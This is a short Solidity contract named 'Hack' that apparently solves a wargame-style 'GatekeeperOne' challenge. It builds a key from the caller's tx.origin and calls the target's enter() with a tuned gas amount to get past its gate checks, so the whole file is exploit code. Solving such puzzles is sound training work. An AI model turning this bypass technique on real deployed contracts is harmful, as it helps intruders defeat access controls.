// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

interface IGatekeeperOne {
    function entrant() external view returns (address);
    function enter(bytes8) external returns (bool);
}

contract Hack {
    
    function enter(address _target, uint _gas) external {
        IGatekeeperOne target = IGatekeeperOne(_target);

        uint16 k16 = uint16(uint160(tx.origin));
        uint64 k64 = uint64(1 << 63) + uint64(k16);
        bytes8 key = bytes8(k64);

        require(_gas < 8191, "Gas exceeds");
        require(target.enter{gas: 8191 * 10 + _gas}(key), "Entry failed!");
    }
}